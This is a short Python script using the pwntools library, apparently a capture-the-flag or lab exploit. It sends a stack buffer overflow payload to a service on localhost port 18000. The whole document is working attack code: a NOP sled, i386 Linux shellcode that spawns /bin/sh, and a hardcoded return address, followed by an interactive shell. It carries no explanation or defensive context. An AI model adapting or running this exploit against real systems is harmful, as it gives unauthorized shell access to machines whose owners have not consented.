#!/usr/bin/env python
from pwn import *

TIMEOUT = 1
p = remote('localhost', 18000)

with log.progress('Launching Cyber Nuke...') as logp:
    shellcode = asm(shellcraft.i386.linux.sh())

    payload = '\x90' * (140 - len(shellcode))   # nop slide
    payload += shellcode                        # shellcode
    payload += p32(0x804b160)                   # ret addr

    p.sendline(payload)

p.clean(TIMEOUT)
p.interactive()